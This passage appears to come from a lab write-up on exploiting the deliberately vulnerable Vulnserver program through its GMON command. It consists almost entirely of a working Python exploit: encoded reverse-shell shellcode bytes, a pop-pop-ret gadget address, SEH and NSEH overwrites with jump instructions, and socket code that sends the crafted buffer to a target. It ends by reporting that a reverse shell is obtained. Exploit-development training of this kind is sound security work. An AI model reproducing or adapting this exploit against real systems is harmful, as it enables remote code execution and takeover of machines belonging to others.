payload += b"\x3a\x97\x78\x2c\xb5\xc8\x99\x4f\x1f\x61\x33\xaa"
payload += b"\xc8\x84\xc4\xb6\x47\xf1\xc6\xb6\x57\x34\x4e\x50"
payload += b"\x3d\x26\x06\xcb\xaa\xdf\x03\x87\x4b\x1f\x9e\xe2"
payload += b"\x4c\xab\x2d\x13\x02\x5c\x5b\x07\xf3\xac\x16\x75"
payload += b"\x52\xb2\x8c\x11\x38\x21\x4b\xe1\x37\x5a\xc4\xb6"
payload += b"\x10\xac\x1d\x52\x8d\x97\xb7\x40\x4c\x41\xff\xc0"
payload += b"\x8b\xb2\xfe\xc9\x5e\x8e\x24\xd9\xa6\x0f\x61\x8d"
payload += b"\x76\x46\x3f\x7b\x31\x30\xf1\xd5\xeb\xef\x5b\xb1"
payload += b"\x6a\xdc\x5b\xc7\x72\x09\x2a\x27\xc2\xe4\x6b\x58"
payload += b"\xeb\x60\x7c\x21\x11\x11\x83\xf8\x91\x2f\x75\x30"
payload += b"\x0c\xa7\x2c\xa1\x6d\xa5\xce\x1c\xb1\xd0\x4c\x94"
payload += b"\x4a\x27\x4c\xdd\x4f\x63\xca\x0e\x22\xfc\xbf\x30"
payload += b"\x91\xfd\x95"

ppr_address = 0x625010b4
ppr_gadget = struct.pack("<I", ppr_address)

buf = b""
buf += b"GMON /."

# step 3
# execute payload
buf += NOP * 32
buf += payload
buf += b"A" * (offset - 16 - 32 - len(payload)) # filler

# Step 2 -- long jump
# jump back 3533 bytes to the start of the AAAA
# nasm>  jmp -3533
buf += b"\xE9\x2E\xF2\xFF\xFF"
buf += NOP * 11

# Step 1 -- NSEH Overwrite -- short jump
# jump back 16 bytes
# nasm>  jmp $-16
buf += b"\xEB\xEE" + NOP + NOP

# Step 0 -- SEH Overwrite -- jump to pop pop return
buf += ppr_gadget

buf += b"D" * (size - offset - 8) # filler
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# shift + f9

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

After passing the exception we receive a reverse shell:

![Reverse Shell](/assets/img/vulnserver_gmon_70_revshell.png)
